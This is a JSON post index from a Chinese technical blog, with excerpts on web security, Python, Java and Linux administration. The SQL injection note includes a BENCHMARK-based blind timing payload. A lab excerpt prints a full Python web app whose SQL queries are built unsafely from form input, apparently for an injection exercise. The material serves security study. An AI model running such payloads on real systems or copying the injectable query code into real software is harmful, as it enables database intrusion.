是指一组项目构成的整体，双重&#x2F;三重&#x2F;四重&#x2F;五重&#x2F;等的通用形式）。 同源策略是一个重要的安全策略，它用于限制一个origin的文档或者它加载的脚本如何能与另一个源的资源进行交互。它能帮助阻隔恶意文档，减少可能被攻击的媒介。 换言之，a.com通过代码 &lt;script src&#x3D;http://b.com/bjs &gt;&lt;script&gt; 加载了b.com上的b.js，但是b.js是运行在a.com页面中的，因此对于当前打开的页面(a.com)来说，b.js的Origin就应该是a.com而非b.com","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[]},{"title":"跨站脚本攻击","date":"2020-06-16T22:31:15.000Z","path":"posts/e028c83b/","slug":"跨站脚本攻击","permalink":"https://hejueyun.github.io/posts/e028c83b/","excerpt":"可参考本站相关文章辅助理解 《白帽子讲Web安全》笔记 1. 简介 跨站脚本攻击，英文全称是Cross Site Script，本来缩写是CSS，但是为了和层叠样式表(Cascading Style Sheet CSS)有所区别，所以在安全领域叫做“XSS “ XSS攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。在一开始，这种攻击的演示案例是跨域的，所以叫做“跨站脚本”。但是发展到今天，由于JavaScript的强大功能以及网站前端应用的复杂化，是否跨域已经不再重要。但是由于历史原因，XSS这个名字却一直保留下来。 1.1. 跨站 大多数情况 A站访客受到的XSS攻击代码是来自于B站 通过攻击得到的数据反馈会传至B站 故称跨站","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[]},{"title":"sql注入","date":"2020-06-16T22:30:20.000Z","path":"posts/530fceb2/","slug":"sql注入","permalink":"https://hejueyun.github.io/posts/530fceb2/","excerpt":"1. 盲注 所谓“盲注”，就是在服务器没有错误回显时完成的注入攻击。服务器没有错误回显，对于攻击者来说缺少了非常重要的“调试信息”，所以攻击者必须找到一个方法来验证注入的SQL语句是否得到执行。 and 1=1 and 1=2看两次页面是否一样 1.1. Timing Attack 利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长;通过时间长短的变化，可以判断出注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack benchmark(count,expr) 讲expr执行count次 1UNION SELECT IF (SUBSTRING(current,1,1) = CHAR(97),BENCHMARK(5000000, md5( &#x27;test&#x27; )),null) FROM (SELECT DATABASE() as current) as tbl; DATABASE()读取当前数据库名，SUBSTRING()下标1长1子串，benchmark重复次数5000000 union是为了和之前的select拼接","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Web Security","slug":"Security/Web-Security","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/"},{"name":"Note","slug":"Security/Web-Security/Note","permalink":"https://hejueyun.github.io/categories/Security/Web-Security/Note/"}],"tags":[]},{"title":"简易教务系统的漏洞web开发","date":"2020-06-16T21:19:01.000Z","path":"posts/6cec214f/","slug":"简易教务系统的漏洞web开发","permalink":"https://hejueyun.github.io/posts/6cec214f/","excerpt":"1. 实验内容1.1. 创建db12345create table teacher( courseid int, studentid int, grade text ); 1.2. 网站代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168# -*- coding: utf-8 -*-import sysimport cgifrom http.server import HTTPServer, BaseHTTPRequestHandlerimport sqlite3def insert_into_db(course_id,student_id,grade): print(&quot;insert database&quot;) conn = sqlite3.connect(&#x27;./edu_admin.db&#x27;) c = conn.cursor() try: c.execute(&quot;select * from teacher where courseid = %s and studentid = %s &quot; % (course_id,student_id)) jud = c.fetchall() if len(jud) == 0: c.execute(&quot;INSERT INTO teacher VALUES (%s,%s,%s)&quot; %(course_id,student_id,grade)) # Save (commit) the change conn.commit() except: print(&quot;already exist&quot;) conn.rollback() conn.close()def select_from_db(course_id,student_id): print(&quot;select database&quot;) conn = sqlite3.connect(&#x27;./edu_admin.db&#x27;) c = conn.cursor() try: c.execute(&quot;select * from teacher where courseid = %s and studentid = %s &quot; % (course_id,student_id)) res = c.fetchall() if len(res) == 0: print(&quot;no student / no course&quot;) conn.close() return &quot;error&quot; else: conn.close() return res except: print(&quot;error&quot;) conn.close() return &quot;error&quot;class MyHTTPRequestHandler(BaseHTTPRequestHandler): course_id = &#x27;course_id&#x27; student_id = &#x27;student_id&#x27; grade = &#x27;grade&#x27; def do_GET(self): print(&quot;get success&quot;) path = self.path print(path) if path == &quot;/grade&quot;: form_html = \\ &#x27;&#x27;&#x27; &lt;html&gt; &lt;body&gt; &lt;form method=&#x27;post&#x27; enctype=&#x27;multipart/form-data&#x27;&gt; query the scores &lt;/br&gt; course id:&lt;/br&gt; &lt;input type=&#x27;text&#x27; name=&#x27;%s&#x27;&gt;&lt;/br&gt; student id:&lt;/br&gt; &lt;input type=&#x27;text&#x27; name=&#x27;%s&#x27;&gt;&lt;/br&gt; &lt;input type=&#x27;submit&#x27;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &#x27;&#x27;&#x27; % (&#x27;course_id&#x27;,&#x27;student_id&#x27;) self.send_response(200) self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;) self.end_headers() self.wfile.write(form_html.encode()) elif path == &quot;/teacher&quot;: form_html = \\ &#x27;&#x27;&#x27; &lt;html&gt; &lt;body&gt; &lt;form method=&#x27;post&#x27; enctype=&#x27;multipart/form-data&#x27;&gt; course id:&lt;/br&gt; &lt;input type=&#x27;text&#x27; name=&#x27;%s&#x27;&gt;&lt;/br&gt; student id:&lt;/br&gt; &lt;input type=&#x27;text&#x27; name=&#x27;%s&#x27;&gt;&lt;/br&gt; grade:&lt;br&gt; &lt;input type=&#x27;text&#x27; name=&#x27;%s&#x27;&gt;&lt;/br&gt; &lt;input type=&#x27;submit&#x27;&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; &#x27;&#x27;&#x27; % (&#x27;course_id&#x27;,&#x27;student_id&#x27;,&#x27;grade&#x27;) self.send_response(200) self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;) self.end_headers() self.wfile.write(form_html.encode()) def do_POST(self): print(&quot;post success&quot;) form_data = cgi.FieldStorage( fp=self.rfile, headers=self.headers, environ=&#123; &#x27;REQUEST_METHOD&#x27;: &#x27;POST&#x27;, &#x27;CONTENT_TYPE&#x27;: self.headers[&#x27;Content-Type&#x27;], &#125;) fields = form_data.keys() if len(fields) == 2: if self.course_id in fields and self.student_id in fields: course = form_data[self.course_id].value print(course) student = form_data[self.student_id].value print(student) # database res = select_from_db(course,student) print(res) if res == &quot;error&quot;: self.send_response(200) self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;) self.end_headers() self.wfile.write(b&quot;&lt;html&gt;&lt;body&gt;query error &lt;/body&gt;&lt;/html&gt;&quot;) else: result = res[0] result = result[2] self.send_response(200) self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;) self.end_headers() str = &quot;&lt;html&gt;&lt;body&gt;scores: %s &lt;/body&gt;&lt;/html&gt;&quot; % result self.wfile.write(str.encode()) else : if self.course_id in fields and self.student_id in fields and self.grade in fields: course = form_data[self.course_id].value print(course) student = form_data[self.student_id].value print(student) gra = form_data[self.grade].value print(gra) # file = open(&quot;.&quot;+self.path, &quot;wb&quot;) # file.write(&quot;course_id: %s student_id: %s grade: %s \\n&quot; % (course,student,gra)) # database insert_into_db(course,student,gra) self.send_response(200) self.send_header(&quot;Content-type&quot;, &quot;text/html&quot;) self.end_headers() self.wfile.write(b&quot;&lt;html&gt;&lt;body&gt;OK&lt;/body&gt;&lt;/html&gt;&quot;)class MyHTTPServer(HTTPServer): def __init__(self, host, port): print(&quot;run app server by python!&quot;) HTTPServer.__init__(self, (host, port), MyHTTPRequestHandler)if &#x27;__main__&#x27; == __name__: server_ip = &quot;127.0.0.1&quot; server_port = 8080 if len(sys.argv) == 2: server_port = int(sys.argv[1]) if len(sys.argv) == 3: server_ip = sys.argv[1] server_port = int(sys.argv[2]) print(&quot;App server is running on http://%s:%s &quot; % (server_ip, server_port)) server = MyHTTPServer(server_ip, server_port) server.serve_forever() 输入127.0.0.1:8080/teacher 1.3. 攻击 teacher表 url/grade","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"Javascript-Overview","date":"2020-06-15T20:01:40.000Z","path":"posts/3742deff/","slug":"Javascript-Overview","permalink":"https://hejueyun.github.io/posts/3742deff/","excerpt":"1. 概论 JavaScript（通常缩写为JS）是一种高级的、解释型的编程语言。JavaScript是一门基于原型、函数先行的语言，是一门多范式的语言，它支持面向对象编程，命令式编程，以及函数式编程 在客户端，JavaScript在传统意义上被实现为一种解释语言，但在最近，它已经可以被即时编译（JIT）执行 一般来说，完整的JavaScript包括以下几个部分： ECMAScript，描述了该语言的语法和基本对象 文档对象模型（DOM），描述处理网页内容的方法和接口 浏览器对象模型（BOM），描述与浏览器进行交互的方法和接口 JavaScript的基本特点如下： 是一种解释性脚本语言（代码不进行预编译）。 主要用来向HTML页面添加交互行为。 可以直接嵌入HTML页面，但写成单独的js文件有利于结构和行为的分离。 JavaScript是一种脚本语言，其源代码在发往客户端运行之前不需经过编译，而是将文本格式的字符代码发送给浏览器由浏览器解释运行。解释型语言的弱点是安全性较差，而且在JavaScript中，如果一条运行不了，那么下面的语言也无法运行。而其解决办法就是于使用异常处理try&#123;&#125;catch()&#123;&#125; 1.1. 示例1234567891011121314&lt;!DOCTYPE HTML&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;简单的JavaScript Hello World&lt;/title&gt; &lt;script type=&quot;text/javascript&quot;&gt; document.write(&quot;Hello, world!&quot;); // 在浏览器视窗内直接显示 alert(&quot;Hello, world!&quot;); // 弹窗显示 console.log(&quot;Hello, world!&quot;); // 在控制台（console）里显示，需要先开启开发工具控制台 &lt;/script&gt; &lt;/head&gt; &lt;body&gt; HTML内容…… &lt;/body&gt;&lt;/html&gt; 或是在浏览器的地址栏中使用javascript:，以交互方式表示 1javascript:alert(&quot;Hello world!&quot;); 2. 数据类型The latest ECMAScript(ES6) standard defines seven data types: Out of which six data types are Primitive(predefined). Numbers: 5, 6.5, 7 etc. String: “Hello GeeksforGeeks” etc. Boolean: Represent a logical entity and can have two values: true or false. Null: This type has only one value : null. Undefined: A variable that has not been assigned a value is undefined. Object: It is the most important data-type andforms the building blocks for modern JavaScript. We will learn aboutthese data types in details in further articles. 2.1. 命名","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Javascript","slug":"Program-Language/Javascript","permalink":"https://hejueyun.github.io/categories/Program-Language/Javascript/"},{"name":"Basic","slug":"Program-Language/Javascript/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Javascript/Basic/"}],"tags":[]},{"title":"python小知识-1","date":"2020-06-13T13:47:33.000Z","path":"posts/55de45bc/","slug":"python小知识-1","permalink":"https://hejueyun.github.io/posts/55de45bc/","excerpt":"1. set().update方法合并两个集合，重复元素只会出现一次","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Basic","slug":"Program-Language/Python/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Basic/"}],"tags":[]},{"title":"高性能mysql-1","date":"2020-06-12T13:44:31.000Z","path":"posts/81359606/","slug":"高性能mysql-1","permalink":"https://hejueyun.github.io/posts/81359606/","excerpt":"","categories":[],"tags":[]},{"title":"Java-Overview","date":"2020-06-11T11:51:57.000Z","path":"posts/1bca6fe6/","slug":"Java-Overview","permalink":"https://hejueyun.github.io/posts/1bca6fe6/","excerpt":"1. 特性 Java is a platform-independent language: The programs written in Java language, after compilation, are converted into an intermediate level language called the bytecode which is a part of the Java platform irrespective of the machine on which the programs run. This makes java highly portable as its bytecodes can be run on any machine by an interpreter called the Java Virtual Machine(JVM) and thus java provides ‘reusability of code’. Java是一种独立于平台的语言。用Java语言编写的程序，经过编译后，被转换成一种叫做字节码的中间级语言，它是Java平台的一部分，无论程序在哪台机器上运行。这使得java具有很强的可移植性，因为它的字节码可以通过称为Java虚拟机（JVM）的解释器在任何机器上运行，因此java提供了 “代码的可重用性”。 Java is a multithreaded language: Java can perform many tasks at once by defining multiple threads. For example, a program that manages a Graphical User Interface (GUI) while waiting for input from a network connection uses another thread to perform and wait’s instead of using the default GUI thread for both tasks. This keeps the GUI responsive. Java是一种多线程语言。Java可以通过定义多个线程同时执行许多任务。例如，管理图形用户界面（GUI）的程序在等待网络连接输入时，会使用另一个线程来执行和等待，而不是使用默认的GUI线程来执行这两个任务。这样可以保持GUI的响应性。 Java programs can create applets Java is an object-oriented programming language","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Java","slug":"Program-Language/Java","permalink":"https://hejueyun.github.io/categories/Program-Language/Java/"},{"name":"Basic","slug":"Program-Language/Java/Basic","permalink":"https://hejueyun.github.io/categories/Program-Language/Java/Basic/"}],"tags":[]},{"title":"nginx配置笔记","date":"2020-06-02T13:14:43.000Z","path":"posts/b88a25c4/","slug":"nginx配置笔记","permalink":"https://hejueyun.github.io/posts/b88a25c4/","excerpt":"1. 前言1.1. 配置文件位置 对于许多发行版，该文件将位于/etc/nginx/nginx.conf。如果它不存在，也可能在 /usr/local/nginx/conf/nginx.conf 或 /usr/local/etc/nginx/nginx.conf","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Basic","slug":"Operating-System/Linux/Basic","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Basic/"}],"tags":[]},{"title":"Linux Inside:引导","date":"2020-05-29T14:00:35.000Z","path":"posts/82d1c2f7/","slug":"Linux-Inside-引导","permalink":"https://hejueyun.github.io/posts/82d1c2f7/","excerpt":"1. 从引导加载程序内核1.1. 主板-&gt;电源 电脑在你按下电源开关的时候，就开始工作。 主板发送信号给电源，而电源收到信号后会给电脑供应合适的电量。 一旦主板收到了电源备妥信号，它会尝试启动 CPU。 CPU 则复位寄存器的所有数据，并设置每个寄存器的预定值。CPU 则复位寄存器的所有数据，并设置每个寄存器的预定值。 2.","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Linux Inside","slug":"Operating-System/Linux/Linux-Inside","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Linux-Inside/"}],"tags":[]},{"title":"xss攻击实验","date":"2020-05-27T07:04:49.000Z","path":"posts/febfd923/","slug":"xss攻击实验","permalink":"https://hejueyun.github.io/posts/febfd923/","excerpt":"1. 实验目的 搭建漏洞网页 xss攻击实现 Stored XSS Reflected XSS","categories":[{"name":"Security","slug":"Security","permalink":"https://hejueyun.github.io/categories/Security/"},{"name":"Software Security","slug":"Security/Software-Security","permalink":"https://hejueyun.github.io/categories/Security/Software-Security/"}],"tags":[{"name":"sec","slug":"sec","permalink":"https://hejueyun.github.io/tags/sec/"}]},{"title":"实验:hadoop的安装与简单使用","date":"2020-05-26T21:53:28.000Z","path":"posts/5de3efa7/","slug":"实验-hadoop的安装与简单使用","permalink":"https://hejueyun.github.io/posts/5de3efa7/","excerpt":"1. 实验目的 hadoop的安装与简单使用","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Lab","slug":"Sql/Lab","permalink":"https://hejueyun.github.io/categories/Sql/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"Flask浅析-2","date":"2020-05-25T20:18:28.000Z","path":"posts/fb3c9f9a/","slug":"Flask浅析-2","permalink":"https://hejueyun.github.io/posts/fb3c9f9a/","excerpt":"1. wsgi可参考之前的webserver搭建及sql注入 我们定义了一个hello_world函数，这个函数接受两个参数。分别是environ和start_response，我们将这个hello_world传递给eventlet.wsgi.server以后， eventlet.wsgi.server在调用hello_world时，会自动传入environ和start_response这两个参数，并接受hello_world的返回值。而这，就是WSGI的作用 也就是说，在python的世界里，通过WSGI约定了web服务器怎么调用web应用程序的代码，web应用程序需要符合什么样的规范，只要web应用程序和web服务器都遵守WSGI 协议，那么，web应用程序和web服务器就可以随意的组合。这也就是WSGI存在的原因。 需要注意两个相近的概念： uwsgi同WSGI一样是一种协议 uWSGI是实现了uwsgi和WSGI两种协议的web服务器","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Web","slug":"Program-Language/Python/Web","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Web/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://hejueyun.github.io/tags/Flask/"}]},{"title":"Python数据模型","date":"2020-05-25T13:18:54.000Z","path":"posts/5b4987c1/","slug":"python数据模型","permalink":"https://hejueyun.github.io/posts/5b4987c1/","excerpt":"1. 对象(Objects) 对象 是 Python 中对数据的抽象。 Python 程序中的所有数据都是由对象或对象间关系来表示的 每个对象都有: 编号(identity) id() 函数能返回一个代表其编号的整型数；在 CPython 中，id(x) 就是存放 x 的内存的地址 ‘is’ 运算符可以比较两个对象的编号是否相同 类型(type) type() 函数能返回一个对象的类型 (类型本身也是对象) 值(value) 可变：字典和列表 不可变：数字、字符串和元组 对象绝不会被显式地销毁；然而，当无法访问时它们可能会被作为垃圾回收 有些对象包含对 “外部” 资源的引用，例如打开文件或窗口。当对象被作为垃圾回收时这些资源也应该会被释放，但由于垃圾回收并不确保发生，这些对象还提供了明确地释放外部资源的操作，通常为一个 close() 方法。强烈推荐在程序中显式关闭此类对象。’try…finally’ 语句和 ‘with’ 语句提供了进行此种操作的更便捷方式。 有些对象包含对其他对象的引用；它们被称为 容器。容器的例子有元组、列表和字典等","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Advanced","slug":"Program-Language/Python/Advanced","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"}],"tags":[]},{"title":"Python反射","date":"2020-05-24T15:24:46.000Z","path":"posts/db9e9042/","slug":"python反射","permalink":"https://hejueyun.github.io/posts/db9e9042/","excerpt":"1. 概述 反射（reflection），或称“自省”（introspection）是指Python脚本可以得到一个对象的类型、class、属性、方法等信息。 在某些时候，需要执行对象的某个方法，或是需要给对象的某个字段赋值，而方法名或是字段名在编写代码时并不能确定，需要通过字符串参数传递的形式输入。 下列函数实现了反射：type(), isinstance(), issubclass(), callable(), dir(), getattr() Reflection refers to the ability for code to be able to examine attributes about objects that might be passed as parameters to a function","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Advanced","slug":"Program-Language/Python/Advanced","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Advanced/"}],"tags":[]},{"title":"Flask浅析-1","date":"2020-05-19T19:26:39.000Z","path":"posts/ec83c05/","slug":"Flask浅析","permalink":"https://hejueyun.github.io/posts/ec83c05/","excerpt":"本文是理解Flask，尤其是要处理异步io(asyncio)的前置知识","categories":[{"name":"Program Language","slug":"Program-Language","permalink":"https://hejueyun.github.io/categories/Program-Language/"},{"name":"Python","slug":"Program-Language/Python","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/"},{"name":"Web","slug":"Program-Language/Python/Web","permalink":"https://hejueyun.github.io/categories/Program-Language/Python/Web/"}],"tags":[{"name":"Flask","slug":"Flask","permalink":"https://hejueyun.github.io/tags/Flask/"}]},{"title":"awk笔记","date":"2020-05-17T15:42:10.000Z","path":"posts/52958d72/","slug":"awk笔记","permalink":"https://hejueyun.github.io/posts/52958d72/","excerpt":"1. 概要 文本和数据进行处理的编程语言 awk 是一种编程语言，用于在linux&#x2F;unix下对文本和数据进行处理 12awk [options] &#x27;script&#x27; var=value file(s)awk [options] -f scriptfile var=value file(s) -v var=value 赋值一个用户定义变量，将外部变量传递给awk -f scripfile 从脚本文件中读取awk命令","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Basic","slug":"Operating-System/Linux/Basic","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Basic/"}],"tags":[{"name":"Shell","slug":"Shell","permalink":"https://hejueyun.github.io/tags/Shell/"}]},{"title":"shell脚本编程基础","date":"2020-05-16T14:01:05.000Z","path":"posts/48ec4ca9/","slug":"shell脚本编程基础","permalink":"https://hejueyun.github.io/posts/48ec4ca9/","excerpt":"1. 实验内容 用bash编写一个图片批处理脚本，实现以下功能： 支持命令行参数方式使用不同功能 支持对指定目录下所有支持格式的图片文件进行批处理 支持以下常见图片批处理功能的单独使用或组合使用 支持对jpeg格式图片进行图片质量压缩 支持对jpeg&#x2F;png&#x2F;svg格式图片在保持原始宽高比的前提下压缩分辨率 支持对图片批量添加自定义文本水印 支持批量重命名（统一添加文件名前缀或后缀，不影响原始文件扩展名） 支持将png&#x2F;svg图片统一转换为jpg格式图片 用bash编写一个文本批处理脚本，对附件：2014世界杯运动员数据分别进行批量处理完成相应的数据统计任务： 统计不同年龄区间范围（20岁以下、[20-30]、30岁以上）的球员数量、百分比 统计不同场上位置的球员数量、百分比 名字最长的球员是谁？名字最短的球员是谁？ 年龄最大的球员是谁？年龄最小的球员是谁？ 用bash编写一个文本批处理脚本，对附件：Web服务器访问日志分别进行批量处理完成相应的数据统计任务： 统计访问来源主机TOP 100和分别对应出现的总次数 统计访问来源主机TOP 100 IP和分别对应出现的总次数 统计最频繁被访问的URL TOP 100 统计不同响应状态码的出现次数和对应百分比 分别统计不同4XX状态码对应的TOP 10 URL和对应出现的总次数 给定URL输出TOP 100访问来源主机","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Lab","slug":"Operating-System/Linux/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"},{"name":"Shell","slug":"Shell","permalink":"https://hejueyun.github.io/tags/Shell/"}]},{"title":"Netplan","date":"2020-05-06T17:09:34.000Z","path":"posts/212d8ddd/","slug":"Netplan","permalink":"https://hejueyun.github.io/posts/212d8ddd/","excerpt":"1. Preview 多年以来 Linux 管理员和用户们以相同的方式配置他们的网络接口。例如，如果你是 Ubuntu 用户，你能够用桌面 GUI 配置网络连接，也可以在 &#x2F;etc&#x2F;network&#x2F;interfaces 文件里配置。配置相当简单且可以奏效。在文件中配置看起来就像这样 123456auto enp10s0iface enp10s0 inet static address 192.168.1.162 netmask 255.255.255.0 gateway 192.168.1.100 dns-nameservers 1.0.0.1,1.1.1.1 尔后重启网络 sudo systemctl restart networking sudo /etc/init.d/networking restart 但是现在，在某些发行版上（例如 Ubuntu Linux 18.04），网络的配置与控制发生了很大的变化。不需要那个 interfaces 文件和 &#x2F;etc&#x2F;init.d&#x2F;networking 脚本，我们现在转向使用 Netplan.","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Basic","slug":"Operating-System/Linux/Basic","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Basic/"}],"tags":[]},{"title":"实验:Linux服务器系统管理基础","date":"2020-04-25T12:56:40.000Z","path":"posts/33c7001c/","slug":"Linux服务器系统管理基础","permalink":"https://hejueyun.github.io/posts/33c7001c/","excerpt":"1. 基础知识1.1. 远程管理工具箱 tmux tmux is a terminal multiplexer for Unix-like operating systems. It allows multiple terminal sessions to be accessed simultaneously in a single window. It is useful for running more than one command-line program at the same time. It can also be used to detach processes from their controlling terminals, allowing SSH sessions to remain active without being visible","categories":[{"name":"Operating System","slug":"Operating-System","permalink":"https://hejueyun.github.io/categories/Operating-System/"},{"name":"Linux","slug":"Operating-System/Linux","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/"},{"name":"Lab","slug":"Operating-System/Linux/Lab","permalink":"https://hejueyun.github.io/categories/Operating-System/Linux/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"加布里埃尔·塔尔德","date":"2020-04-07T12:43:53.000Z","path":"posts/54481d74/","slug":"《传播与社会影响》笔记","permalink":"https://hejueyun.github.io/posts/54481d74/","excerpt":"选自《传播与社会影响》的绪论部分以及”The Sociological Theories of Gabriel Tarde” 1. 绪言1.1. 生平 让-加布里埃尔·塔尔德1843年生于波尔多市以东100英里的小镇萨拉 塔尔德17岁离开学校。和同时代的卡尔·马克思、克劳德·贝尔纳等许多年轻人一样，塔尔德首先尝试写诗歌和剧本 塔尔德喜欢贬低他所从事的司法业务的意义。但是这些活动的确使他对犯罪原因产生兴趣，又使他接触到意大利犯罪学家的著作 1890年出版著作《模仿律》(Les lois de L’imitation) 这成为他最著名的社会学著作 青年时代的眼疾再次发作，于1904年辞世 1.2. 发明 塔尔德认为，发明是人类一切革新和进步的终极源泉，所以发明是一个方便的出发点 在塔尔德的眼里，社会分层有助于发明，因为它为上层阶级提供了更多的闲暇，使社会精英之间能够更好地交流与互动。如果思想接触的密度增加，思想交换越来越多，相应的创造性发现就越来越多。阶级界线上某种最低限度的僵化也可以隔离精英，使之不受平民思想的抑制。 他强调传播是发明的前提:在其他条件相同的情况下，一个民族越是与外界隔绝，它的发明创造能力就越是低下。塔尔德推论说，大洋洲等地古代的前文字社会之所以发展迟缓，那是由于极端的地理或社会隔绝状态。 塔尔德指出，不同的文化价值使不同的社会具有不同的发展倾向，使创造力倾向于不同的速度或类型。价值使社会中的个体行为者追求的目标具有不同的结构，使一些类型的活动比其他活动重要。 1.3. 模仿 最基本的“模仿律”之一是，新发明越是像社会中业已被模仿与制度化的旧发明，就越可能被社会模仿。塔尔德把这个规律叫做“逻辑模仿律”( logical law of imitation)……这个概念通向另一条原理:越接近最先进技术属性的发明，就越可能被社会模仿……这条定律有一个“超逻辑形式”—越是满足文化里主导性重点的发明，越是可能被该文化模仿。它使人注意文化中的非技术因素，比如强调新奇而不是传统的文化因素。 社会底层的人可以直接模仿最高阶层而不必通过中介来传播模仿时，这个社会就是民主社会。 塔尔德试图把握模仿模式的长远趋势:从单向模仿走向交互式模仿。……弱势者接触强势者的思想之后，也谋求受别人的模仿。持续不断的社会互动逐渐消磨掉互动者的等级差异。 1.4. 对立 塔尔德给对立下的定义有点独特:对立不是两个实体之间的最大差异，而是一种特殊的重复—“两个类似的事物由于类似性而互相摧毁”。 个人内心的冲突很严重时，他难以调和内心的对立;个人内心太分裂时就不可能行动，社会冲突就会小到最低限度。卿〕内在对立外化之后，心理上的紧张大大减缓，社会冲突水平随之提高。因此，社会冲突越大，心理紧张就越小，反之亦然。","categories":[],"tags":[{"name":"essay","slug":"essay","permalink":"https://hejueyun.github.io/tags/essay/"}]},{"title":"mysql cluster搭建实验","date":"2020-04-02T13:32:45.000Z","path":"posts/328f2a3f/","slug":"mysql-cluster搭建实验","permalink":"https://hejueyun.github.io/posts/328f2a3f/","excerpt":"1. 实验目的 配置mysql cluster","categories":[{"name":"Sql","slug":"Sql","permalink":"https://hejueyun.github.io/categories/Sql/"},{"name":"Lab","slug":"Sql/Lab","permalink":"https://hejueyun.github.io/categories/Sql/Lab/"}],"tags":[{"name":"Lab","slug":"Lab","permalink":"https://hejueyun.github.io/tags/Lab/"}]},{"title":"无人值守ISO的制作与安装","date":"2020-03-27T14:22:50.000Z","path":"posts/7b3ee81d/","slug":"无人值守ISO的制作与安装","permalink":"https://hejueyun.github.io/posts/7b3ee81d/","excerpt":"1. 实验要求 完成“无人值守”ISO镜像制作 定制一个普通用户名和默认密码 定制安装OpenSSH Server 安装过程禁止自动联网更新软件包 利用制作好的ISO镜像，在VirtualBox上执行无人安装","categories":[{"name":"Operating 